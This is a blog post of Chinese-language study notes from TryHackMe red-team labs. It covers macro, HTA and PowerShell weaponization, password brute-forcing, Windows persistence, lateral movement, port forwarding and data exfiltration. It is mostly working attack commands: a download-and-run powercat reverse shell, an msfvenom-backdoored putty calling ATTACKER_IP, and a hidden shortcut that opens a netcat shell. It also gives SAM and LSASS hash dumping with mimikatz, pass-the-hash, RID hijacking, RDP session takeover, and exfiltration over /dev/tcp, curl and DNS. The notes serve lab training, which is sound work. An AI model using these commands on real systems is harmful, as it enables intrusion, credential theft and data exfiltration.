
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/hu1j/p/18826792" title="发布于 2025-04-15 15:27">
    <span role="heading" aria-level="2">Tryhackme部分翻译学习</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="tryhackme部分翻译学习">Tryhackme部分翻译学习</h1>
<h2 id="1weaponization">1.Weaponization</h2>
<h3 id="wsh">WSH</h3>
<p>上传txt到桌面</p>
<pre><code>Set shell = WScript.CreateObject("Wscript.Shell")

shell.Run("C:\Windows\System32\calc.exe " &amp; WScript.ScriptFullName),0,Ture
</code></pre>
<p>wscript /e:vbscript 1.txt</p>
<h3 id="hta">HTA</h3>
<pre><code class="language-javascript">&lt;html&gt;
&lt;body&gt;
&lt;script&gt;
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/b7858a538fb710e397f083f83105e298.png" alt="" loading="lazy"></p>
<p>访问下载并运行，弹出cmd</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/0755b0b65e73d347d1a2ba4ce6377f5a.png" alt="" loading="lazy"></p>
<h3 id="vba">vba</h3>
<p>找到Macros</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/0f15c1c03688619d4b0cbe949db0aa63.png" alt="" loading="lazy"></p>
<pre><code class="language-javascript">Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
</code></pre>
<p>保存为Word 97-2003 Document类型，再次打开doc文件，</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/071091a245a2110d7fc2211a865abe56.png" alt="" loading="lazy"></p>
<h3 id="psh">PSH</h3>
<p>powershell默认的执行政策是不允许执行以.ps1后缀的PowerShell 脚本，也就是Restricted，这里利用powercat进行绕过完成反弹shell</p>
<p>Bypass Execution Policy</p>
<p>先下载powercat，如何在powercat目录下起个web服务</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/24b850bc76cf1c1ee66d93cfcca42d84.png" alt="" loading="lazy"></p>
<pre><code>powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.97.59:8080/powercat.ps1');powercat -c 10.11.97.59 -p 1337 -e cmd"
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/910400fce5c5b14b7bd0497acc0e8977.png" alt="" loading="lazy"></p>
<h3 id="练习">练习</h3>
<p><img src="https://i-blog.csdnimg.cn/img_convert/7209a9e3af8479715c0358dc9362bb35.png" alt="" loading="lazy"></p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/08682bc1af2ba70ccbf7c01ef3b36232.png" alt="" loading="lazy"></p>
<p>这个会给出本地8080端口的一个hta链接，用上面网站访问后，反弹成功</p>
<p>权限维持</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/48df15202257c9a535e426ec2ce6243f.png" alt="" loading="lazy"></p>
<p>shell命令启动系统的命令行解释器，这里是windows的cmd.exe</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/be5c313a76e9015cd6e6d2a7a35fbb18.png" alt="" loading="lazy"></p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/faaa3676da069d5e64f4be8d8a46da23.png" alt="" loading="lazy"></p>
<h2 id="2passwordattacks">2.passwordattacks</h2>
<p>默认密码https://default-password.info/</p>
<p>弱密码https://github.com/danielmiessler/SecLists/tree/master/Passwords</p>
<h3 id="自定义生成字典">自定义生成字典</h3>
<p>crunch</p>
<pre><code>crunch 6 6 -t pass%%
</code></pre>
<pre><code>crunch 2 2 01234abcd -o crunch.txt
</code></pre>
<h3 id="hashcat字典攻击">hashcat字典攻击</h3>
<p>-a 0 sets the attack mode to a dictionary attack</p>
<p>-m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes</p>
<pre><code>hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt
</code></pre>
<h3 id="hashcat暴力破解">hashcat暴力破解</h3>
<pre><code>hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
</code></pre>
<h3 id="ftp爆破">ftp爆破</h3>
<pre><code>hydra -l ftp -P passlist.txt ftp://10.10.x.x
</code></pre>
<h3 id="smtp爆破">smtp爆破</h3>
<pre><code>hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
</code></pre>
<h3 id="ssh爆破">ssh爆破</h3>
<pre><code>hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
</code></pre>
<h3 id="http登录爆破">http登录爆破</h3>
<p>-l 指定用户名</p>
<p>S=logout.php the success condition to identify the valid credentials</p>
<p>-f to stop the brute-forcing attacks after finding a valid username and password</p>
<pre><code>hydra -l phillips -P 500-worst-passwords.txt 10.10.22.76 http-get-form "/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php" -f
</code></pre>
<h3 id="密码喷洒攻击">密码喷洒攻击</h3>
<h4 id="ssh">ssh</h4>
<h4 id="rdp">rdp</h4>
<p>工具</p>
<p><a href="https://github.com/xFreed0m/RDPassSpray" target="_blank" rel="noopener nofollow">https://github.com/xFreed0m/RDPassSpray</a></p>
<pre><code>python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
</code></pre>
<h4 id="outlook-web-access-owa">Outlook web access (OWA)</h4>
<p>工具</p>
<p><a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener nofollow">https://github.com/dafthack/MailSniper</a></p>
<p><a href="https://github.com/byt3bl33d3r/SprayingToolkit" target="_blank" rel="noopener nofollow">https://github.com/byt3bl33d3r/SprayingToolkit</a></p>
<h4 id="smb">smb</h4>
<p>工具</p>
<p>Metasploit (auxiliary/scanner/smb/smb_login)</p>
<h2 id="3windows-local-persistence">3.windows local persistence</h2>
<p>查看本地组</p>
<pre><code>net localgroup
</code></pre>
<p>将用户添加到管理员组</p>
<pre><code>net localgroup administrators thmuser0 /add
</code></pre>
<p>添加到管理员组太可疑了，换成到backup组</p>
<p>将用户添加到backup组</p>
<pre><code>net localgroup "Backup Operators" thumuser1 /add
</code></pre>
<p>但由于是非特权用户，除非我们将其添加到<strong>远程桌面用户</strong> （RDP） 或<strong>远程管理用户</strong> （WinRM） 组，否则它无法将 RDP 或 WinRM 返回到计算机</p>
<p>将用户添加到WinRW组</p>
<p>由于在windows命令提示符和powershell等命令行环境使用空格分隔命令和参数，所以要加双引号转义</p>
<pre><code>net localgroup "Remote Management Users" thmuser1 /add
</code></pre>
<p>然后就能通过evil-winrm 连接</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/df7cc686d0175be4b2bb97f459afe15e.png" alt="" loading="lazy"></p>
<p>本来因为我们前面加入了backup组，可以读取/写入系统上的任何文件或注册表项，而忽略任何配置的 DACL，这将允许我们复制 SAM 和 SYSTEM 注册表配置单元的内容，然后我们可以使用它来恢复所有用户的密码哈希，从而使我们能够轻易升级到任何管理帐户。但现在可以发现backup operators组已经被禁用了</p>
<p>sam文件：是用来存储本地用户账号密码的文件的数据库<br>
system文件：里面有对sam文件进行加密和加密的密钥</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/891577be3bf13cb33b0540a8ee058487.png" alt="" loading="lazy"></p>
<p>这是由于用户帐户控制 （UAC） 造成的，UAC 实现的功能之一 <strong>LocalAccountTokenFilterPolicy</strong> 在远程登录时会剥夺任何本地帐户的管理权限，由于我们使用的是WinRM，将会被限制为没有管理权限的有限访问令牌。</p>
<p>可以通过修改注册表项更改为1来禁用LocalAccountTokenFilterPolicy</p>
<p>修改注册表项</p>
<pre><code class="language-shell-session">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
</code></pre>
<p>再次连接，就能看到</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/15cef2fb31e6c3b97c95de6f228e4dd5.png" alt="" loading="lazy"></p>
<p>然后备份 SAM和SYSYTEM文件</p>
<pre><code>Evil-WinRM PS C:\&gt; reg save hklm\system system.bak
</code></pre>
<pre><code>Evil-WinRM PS C:\&gt; reg save hklm\sam sam.bak 
</code></pre>
<p>下载到我们的攻击主机上</p>
<pre><code>Evil-WinRM PS C:\&gt; download system.bak
</code></pre>
<pre><code>Evil-WinRM PS C:\&gt; download sam.bak 
</code></pre>
<p>然后利用工具来转储使用用户的密码哈希</p>
<pre><code>user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/146cc81dfbdd6533597e4cfcc5d8bdf2.png" alt="" loading="lazy"></p>
<p>先学习一下组成</p>
<pre><code>Administrator        //用户名 

500                   //用户rid
aad3b435b51404eeaad3b435b51404ee //lmhash(老加密算法)
1cea1d7e8899f69e89088c4cb4bbdaa3 //ntlmhash(新加密算法)
</code></pre>
<p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在</p>
<p>最后就能直接以管理员身份登录</p>
<pre><code>user@AttackBox$ evil-winrm -i 10.10.205.175 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
</code></pre>
<h3 id="rid劫持">RID劫持</h3>
<p>创建用户时，将为其分配一个称为<strong>相对 ID （RID）</strong> 的标识符。RID 只是一个数字标识符，表示整个系统中的用户。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们可以通过将相同的 RID 关联到两个帐户来使 Windows 为非特权用户分配管理员访问令牌。</p>
<p>在任何 Windows 系统中，默认管理员帐户的分配 <strong>RID = 500</strong>，而普通用户的 <strong>RID &gt; = 1000</strong>。</p>
<pre><code>C:\&gt; wmic useraccount get name,sid
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/0d960172a5d5daa26da51bf45453f546.png" alt="" loading="lazy"></p>
<p>RID 是 SID 的最后一位，现在我们只需要将 RID=500 分配给 thmuser3，thmuser3的RID为1010，为此，我们需要使用 <code>Regedit</code> 访问 <strong>SAM</strong>。<strong>SAM</strong> 仅限于 <strong>SYSTEM</strong> 帐户，因此即使是管理员也无法对其进行编辑。要以 <strong>SYSTEM</strong> 身份运行 <code>Regedit</code>，将使用 <code>psexec</code></p>
<pre><code>C:\tools\pstools&gt; PsExec64.exe -i -s regedit
</code></pre>
<p>从 <code>Regedit</code> 中，我们将转到<code>HKLM\SAM\SAM\Domains\Account\Users\</code>机器中每个用户都有一个密钥的地方。由于我们要修改 <code>thmuser3</code>，因此我们需要搜索其 <strong>RID</strong> 为十六进制 (<code>1010 = 0x3F2</code>) 的密钥。在相应的键下，会有一个名为<code>F</code>的值，它在位置 <code>0x30</code> 处保存用户的有效 <strong>RID</strong>：</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/ddf1ac055b7b9fd5150919da8f2b75ad.png" alt="" loading="lazy"></p>
<p><strong>RID</strong> 是使用小尾数法存储的，因此它的字节显示为颠倒的。</p>
<p>现在将用十六进制的管理员RID (<code>500 = 0x01F4</code>) 替换这两个字节，切换字节 (<code>F401</code>)</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/5d3a42b8248c78a68ff0327f881a4a9c.png" alt="" loading="lazy"></p>
<p><strong>thmuser3</strong> 下次登录时，<strong>LSASS</strong> 会将其关联到与 <strong>Administrator</strong> 相同的 <strong>RID</strong>，并授予他们相同的权限</p>
<h3 id="可执行文件">可执行文件</h3>
<pre><code class="language-shell-session">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
</code></pre>
<h3 id="快捷方式">快捷方式</h3>
<p>这是计算机快捷方式原本的属性，指向calc.exe</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/cd2612dbe535069373abe9a73084b6ac.png" alt="" loading="lazy"></p>
<p>写一个脚本</p>
<pre><code class="language-powershell">Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
</code></pre>
<p>然后把target改成</p>
<pre><code class="language-powershell">powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/97c10768672edc797232f7781cae9c24.png" alt="" loading="lazy"></p>
<p>这样就会闪过一个弹窗，然后运行calc.exe，但实际也已经进行了反弹shell</p>
<h2 id="4lateral-movement-and-pivoting横向移动">4.lateral movement and pivoting(横向移动)</h2>
<p>两种类型的管理员</p>
<ul>
<li>本地帐户是本地管理员组的一部分</li>
<li>本地 Administrators 组的域帐户部分</li>
</ul>
<p><strong>用户帐户控制 （UAC）</strong> 对本地管理员（默认管理员帐户除外）施加限制。默认情况下，除非通过 RDP 使用交互式会话，否则本地管理员将无法远程连接到计算机并执行管理任务。Windows 将拒绝通过 RPC、SMB 或 WinRM 请求的任何管理任务，因为此类管理员将使用筛选的介质完整性令牌登录，从而阻止帐户执行特权操作。唯一将获得完全权限的本地帐户是默认管理员帐户。</p>
<p>具有本地管理权限的域帐户不会受到相同的处理，而是使用完全管理权限登录</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/1336c08ef2375e1b727afca3734cb230.png" alt="" loading="lazy"></p>
<p>首先通过ssh进入THMJMP2主机，假设已经获取到THMIIS的具有管理权限的用户名和密码</p>
<p><strong>User:</strong> ZA.TRYHACKME.COM\t1_leonard.summers</p>
<p><strong>Password:</strong> EZpass4ever</p>
<p>先利用msf生成反弹shell的exe文件</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/1abb10056db12fa86b211b59f4ee1fb8.png" alt="" loading="lazy"></p>
<p>smbclient</p>
<p>利用smbclient上传exe到THMIIS的admin$共享目录上</p>
<pre><code>smbclient -c 'put attack.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/f27ce63a867920a490d495f018b5fb68.png" alt="" loading="lazy"></p>
<p>在THMIIS执行</p>
<pre><code>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.17.48 4443"
</code></pre>
<p>此ip是vpn下的ip</p>
<pre><code>nc -lvp 4443
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/9943e74918644551ec93d7c2f33cb9fd.png" alt="" loading="lazy"></p>
<p>接着利用sc形成新的远程连接</p>
<pre><code>sc.exe \\thmiis.za.tryhackme.com create THMservice binPath= "%windir%\aaa.exe" start = auto  
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/59011e927299fbc27ef1f9c820528b6a.png" alt="" loading="lazy"></p>
<p>然后启动sc</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/16e50fb4f7b91319a2e845e24248d3a2.png" alt="" loading="lazy"></p>
<p>可以看到反弹成功</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/93c4148fc9bb0a715733ff6367b2af34.png" alt="" loading="lazy"></p>
<p>找到第一个flag</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/7aa9b3dfe81e089eade007f7ca584bec.png" alt="" loading="lazy"></p>
<h3 id="ntlm-authentication">NTLM Authentication</h3>
<p><img src="https://i-blog.csdnimg.cn/img_convert/feec9699b9aed3618529e7243ac67552.png" alt="" loading="lazy"></p>
<ol>
<li>客户端向其想要访问的服务器发送认证请求。</li>
<li>服务器生成一个随机数，并将其作为挑战发送给客户端。</li>
<li>客户端将自己的 NTLM 密码哈希与挑战（以及其他已知数据）相结合，生成响应以回传给服务器进行验证。</li>
<li>服务器将挑战和响应都转发给域控制器进行验证。</li>
<li>域控制器使用挑战重新计算响应，并将其与客户端最初发送的响应进行比较。如果两者匹配，客户端得到认证；否则拒绝访问。认证结果被发送回服务器。</li>
<li>服务器将认证结果转发给客户端。</li>
</ol>
<p>可以看到只需要NTLM Hash，而不需要实际的明文，所以就算没有破解成功NTLM Hash，也能完成认证</p>
<p>提取NTLM Hash可以用mimikatz读取本地SAM，或直接从LSASS内存中提取哈希值</p>
<h3 id="hash传递">HASH传递</h3>
<h4 id="从本地-sam-提取-ntlm-哈希值">从本地 SAM 提取 NTLM 哈希值</h4>
<pre><code>mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
</code></pre>
<h4 id="从-lsass-内存中提取-ntlm-哈希值">从 LSASS 内存中提取 NTLM 哈希值</h4>
<pre><code>mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
		 Username : bob.jenkins
		 Domain   : ZA
		 NTLM     : 6b4a57f67805a663c818106dc0648484
</code></pre>
<p>可以使用提取的哈希值通过 Mimikatz 进行 “传递哈希”（PTH）攻击，将一个受害用户的访问令牌注入到一个反向 Shell</p>
<pre><code>mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
</code></pre>
<h3 id="kerberos-authentication">Kerberos Authentication</h3>
<p>1.用户发送他的用户名和使用从他密码派生的密钥加密的时间戳到密钥分发中心（KDC）。KDC 通常安装在负责在网络上创建 Kerberos 票据的域控制器上。</p>
<p>KDC 将创建并发送一个票据授予票据（TGT），允许用户请求访问特定服务的票据，而无需将其凭据传递给服务本身。除了 TGT 之外，还会给用户一个会话密钥，他们需要使用它来生成随后的请求。</p>
<p>注意 TGT 是使用 krbtgt 账户的密码哈希进行加密的，因此用户无法访问其内容。重要的是要知道，加密的 TGT 包括会话密钥的副本作为其内容的一部分，KDC 无需存储会话密钥，因为在需要时可以通过解密 TGT 来恢复一个副本</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/3a95c437b2b9fa90fa8bf7a5ac6b0553.png" alt="" loading="lazy"></p>
<p>2.当用户想要连接到网络上的服务，比如共享、网站或数据库时，他们将使用他们的 TGT 向 KDC 请求一个票据授予服务（TGS）。TGS 是仅允许连接到特定服务的票据。为了请求 TGS，用户将发送他的用户名和使用会话密钥加密的时间戳，以及 TGT 和服务主体名称（SPN）。SPN 指示我们打算访问的服务和服务器名称。</p>
<p>作为结果，KDC 将向我们发送一个 TGS 和一个服务会话密钥，我们将需要这个密钥来对我们想要访问的服务进行认证。TGS 是使用服务所有者哈希加密的。服务所有者是运行服务的用户或机器帐户。TGS 包含一个服务会话密钥的副本在其加密内容中，因此服务所有者可以通过解密 TGS 来访问它。</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/68da76ce325dd0ee777e84eaee1aa3c1.png" alt="" loading="lazy"></p>
<p>3.TGS 随后可以发送给所需的服务进行认证和建立连接。服务将使用其配置的帐户密码哈希来解密 TGS 并验证服务会话密钥。</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/061c61d440423eb48447526d50a15fe8.png" alt="" loading="lazy"></p>
<h3 id="rdp劫持">RDP劫持</h3>
<p>当管理员使用远程桌面连接到一台机器，并关闭 RDP 客户端而不是注销时，他的会话将在服务器上无限期保持打开状态。如果在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，可以接管任何现有的 RDP 会话，而无需密码。</p>
<p>如果我们拥有管理员级别的访问权限，我们可以通过我们喜欢的任何方法获取 SYSTEM 权限。现在，我们将使用 psexec 来做到这一点。首先，让我们以管理员身份运行一个 cmd.exe：</p>
<pre><code>PsExec64.exe -s cmd.exe
</code></pre>
<p>通过psexec提权到NT AUTHORITY\SYSTEM</p>
<p>列出服务器上的现有会话</p>
<pre><code>C:\&gt; query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME

&gt;administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM\
</code></pre>
<p>当前使用管理员用户通过 RDP 连接，我们的 SESSIONNAME 将是 <code>rdp-tcp#6</code> 。我们还可以看到一个名为 luke 的用户保留了一个带有 ID <code>3</code> 的会话。任何处于 Disc 状态的会话都是用户保留的，并且目前没有被使用。</p>
<p>使用 tscon.exe 并指定我们将接管的会话 ID，以及我们当前的 SESSIONNAME,以管理员用户的身份连接，接管 luke 的会话</p>
<pre><code>tscon 3 /dest:rdp-tcp#6
</code></pre>
<p>/dest指定目标会话</p>
<p>由 luke 拥有的图形会话 <code>3</code> 将与管理员用户拥有的 RDP 会话 <code>rdp-tcp#6</code> 连接，结果是，我们将恢复 luke 的 RDP 会话，并立即连接到它</p>
<h3 id="端口转发">端口转发</h3>
<h4 id="ssh远程端口转发">ssh远程端口转发</h4>
<p>防火墙策略阻止攻击者的机器直接访问服务器上的 3389 端口。如果攻击者先前已经入侵了 PC-1，并且 PC-1 可以访问服务器的 3389 端口，那么可以使用 PC-1 进行远程端口转发，从而将端口 3389 进行跳板。远程端口转发允许我们从 SSH 客户端（在这种情况下是 PC-1）获取可访问的端口，并将其映射到远程 SSH 服务器（攻击者的机器）。</p>
<p>结果是，在攻击者的机器上将打开一个端口，可以通过 SSH 隧道连接回服务器的 3389 端口。PC-1 将转发连接，以便服务器将所有流量视为来自 PC-1：</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/dbf9bf4182105d3123aa2f5b420b1ef0.png" alt="" loading="lazy"></p>
<p>至于为什么需要使用端口转发，而不是直接在pc-1上面进行rdp连接，在只能通过控制台访问 PC-1 的情况下，我们无法使用任何 RDP 客户端，因为我们没有图形界面。通过将端口提供给攻击者的机器，我们可以使用 Linux RDP 客户端进行连接，比如xfreedrdp</p>
<pre><code class="language-shell">C:\&gt; ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
</code></pre>
<p>这将在 PC-1 和 <code>1.1.1.1</code>（攻击者 PC）之间建立一个 SSH 会话，使用 <code>tunneluser</code> 用户。由于 <code>tunneluser</code> 用户不被允许在攻击者 PC 上运行 shell，我们需要使用 <code>-N</code> 开关运行 <code>ssh</code> 命令，以防止客户端请求 shell，否则连接将立即退出。<code>-R</code> 开关用于请求远程端口转发，语法要求我们首先指示我们将在 SSH 服务器上打开的端口（3389），这个端口是都可以的，不一定要和实际转发端口一致，然后是一个冒号，接着是我们将要转发的套接字的 IP 和端口（3.3.3.3:3389），然后就可以在<code>1.1.1.1</code>上利用rdp连接<code>3.3.3.3</code></p>
<h4 id="ssh本地端口转发">ssh本地端口转发</h4>
<p>本地端口转发允许我们将 SSH 服务器中的一个端口 “拉取” 到 SSH 客户端。在我们的情景中，这可以用于将攻击者机器上的任何服务通过 PC-1 上的一个端口提供出来。这样，任何无法直接连接到攻击者 PC 但可以连接到 PC-1 的主机现在将能够通过跳板主机访问攻击者的服务。</p>
<p>使用这种类型的端口转发将允许我们从通常无法连接回我们的主机运行反向 Shell，或者简单地使我们想要的任何服务对于无法直接连接到我们的机器的机器可用。</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/b1e53551535e6dde57d777d3a3986dc5.png" alt="" loading="lazy"></p>
<p>在pc1上运行命令</p>
<pre><code>C:\&gt; ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
</code></pre>
<p>该命令结构类似于远程端口转发的命令，但使用了 <code>-L</code> 选项进行本地端口转发。该选项要求我们指定 PC-1 用于接收连接的本地套接字（<code>*:80</code>）以及从攻击者的 PC 角度连接的远程套接字（<code>127.0.0.1:80</code>）。</p>
<p>在第二个套接字中使用了 IP 地址 127.0.0.1，因为从攻击者的 PC 角度来看，这是保存要转发的端口 80 的主机。</p>
<p>然后就可以通过 <code>http://2.2.2.2:80</code> 查看攻击者机器发布的网站。</p>
<h4 id="socat端口转发">socat端口转发</h4>
<p>在pc1上使用命令</p>
<pre><code class="language-shell">C:\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/549e1d2cfb847fd5f3cb62f92be34d61.png" alt="" loading="lazy"></p>
<p>监听本地的3389端口，将此端口上的所有连接转发到<code>3.3.3.3</code>的3389端口上，<code>1.1.1.1</code>连接<code>2.2.2.2</code>的3389端口，就能转发到<code>3.3.3.3</code>的3389端口</p>
<h4 id="动态端口转发和socks">动态端口转发和socks</h4>
<p>动态端口转发允许我们通过一个主机进行跳转，并使用 SOCKS 代理建立到我们想要的任何 IP 地址 / 端口的多个连接。</p>
<pre><code class="language-shell">C:\&gt; ssh tunneluser@1.1.1.1 -R 9050 -N
</code></pre>
<p>-R 反向隧道，将远程服务器的9050端口转发到本地计算机上。</p>
<p>在这种情况下，SSH 服务器将在端口 <code>9050</code> 上启动一个 SOCKS 代理，并通过 SSH 隧道转发任何连接请求，最终由 SSH 客户端代理。</p>
<p>并通过proxychains使用socks代理，只要在配置文件中使用和socks代理一样的端口就行</p>
<h2 id="5数据泄露">5.数据泄露</h2>
<h3 id="tcp套接字">TCP套接字</h3>
<p>在跳板机监听8080端口，将数据存到tmp文件夹</p>
<pre><code>thm@jump-box$ nc -lvp 8080 &gt; /tmp/task4-creds.data
</code></pre>
<p>在受害机上</p>
<pre><code>thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/192.168.0.133/8080
</code></pre>
<ol>
<li>使用 tar 命令创建了一个带有 secret 目录内容的 zcf 参数的归档文件。</li>
<li>z 表示使用 gzip 压缩所选文件夹，c 表示创建新存档，f 表示使用存档文件。</li>
<li>然后将创建的 tar 文件传递给 base64 命令，将其转换为 base64 表示。</li>
<li>然后，我们传递了 base64 命令的结果，使用 EBCDIC 编码数据使用 dd 命令创建和复制备份文件。</li>
<li>最后，重定向 dd 命令的输出，以使用指定 IP 和端口上的 TCP 套接字（在本例中为端口 8080）进行传输</li>
</ol>
<p>跳板机就能收到相关数据</p>
<p>ssh</p>
<pre><code class="language-markup">thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
</code></pre>
<p>HTTP</p>
<pre><code class="language-markup">thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
</code></pre>
<h3 id="http隧道">HTTP隧道</h3>
<p>可以从 Internet 访问 uploader.thm.com 服务器，但是，app.thm.com 服务器在本地运行，仅为内部网络提供服务</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/23f4c2ebc56ff41a6b97e7dd94ffbb2c.png" alt="" loading="lazy"></p>
<p>利用neoreg工具搭建http隧道，以thm为key</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/3cde0f9d1c000218604933190aebe25c.png" alt="" loading="lazy"></p>
<p>上传文件到</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/ff9b8559bf49637162259ca96cb2d12d.png" alt="" loading="lazy"></p>
<p>连接到隧道客户端</p>
<pre><code>root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.142.69/uploader/files/tunnel.php
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/2eb43029af3dadd4eb8300a7d0441b77.png" alt="" loading="lazy"></p>
<p>通过本地1080代理就能访问app.thm.com</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/41b06c828b40d7e4a25d3bda28eb2f92.png" alt="" loading="lazy"></p>
<h3 id="dns数据泄露">DNS数据泄露</h3>
<p>DNS协议具有需要考虑的限制，具体如下：</p>
<ul>
<li>完全限定的 <strong>FQDN</strong> 域名（包括 .separators）的最大长度为 <strong>255</strong> 个字符。</li>
<li>子域名（标签）长度不得超过<strong>63</strong>个字符（不包括.com、.net等）。</li>
</ul>
<p><img src="https://i-blog.csdnimg.cn/img_convert/94613d9a3141a326057d784609971b9e.png" alt="" loading="lazy"></p>
<p>NS 代表“域名服务器”，域名服务器记录指示哪个 DNS 服务器对该域具有权威性（即，哪个服务器包含实际 DNS 记录）。域名服务器是一种 DNS 服务器，上面存储了域的所有 DNS 记录，包括 A 记录、MX 记录或 CNAME 记录。</p>
<table>
<thead>
<tr>
<th>example.com</th>
<th>record type:</th>
<th>value:</th>
<th>TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td>@</td>
<td>NS</td>
<td>ns1.exampleserver.com</td>
<td>21600</td>
</tr>
</tbody>
</table>
<p>如example.com的域名服务器是ns1.exampleserver.com</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/65b18593d96c0b82cda0fe3d8c2d003a.png" alt="" loading="lazy"></p>
<ol>
<li>攻击者注册域名，例如 <strong>tunnel.com</strong></li>
<li>攻击者将 tunnel.com 的 NS 记录点设置为攻击者控制的服务器。</li>
<li>恶意软件或攻击者将敏感数据从受害计算机发送到他们控制的域名（例如 passw0rd.tunnel.com，其中 <strong>passw0rd</strong> 是需要传输的数据。</li>
<li>DNS 请求通过本地 DNS 服务器发送，并通过 Internet 转发。</li>
<li>攻击者的权威DNS（恶意服务器）接收到DNS请求。</li>
<li>最后，攻击者从域名中提取密码。</li>
</ol>
